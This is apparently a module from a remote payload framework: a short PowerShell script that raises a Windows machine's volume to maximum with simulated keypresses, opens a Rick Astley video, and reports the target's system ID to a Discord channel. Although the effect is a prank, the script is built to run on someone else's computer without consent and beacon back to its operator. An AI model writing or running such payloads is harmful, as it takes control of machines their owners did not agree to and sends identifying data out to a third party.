# ============================================================
# Rick Roll for Windows - Modular Remote Payload
# ============================================================

$sysid = Get-SystemID

# Set volume to max
$wshShell = New-Object -ComObject WScript.Shell
1..50 | ForEach-Object { $wshShell.SendKeys([char]175) }

# Open Rick Roll
Start-Process "https://www.youtube.com/watch?v=dQw4w9WgXcQ"

Send-Discord "🎵 **Rick Roll Deployed on $sysid**"
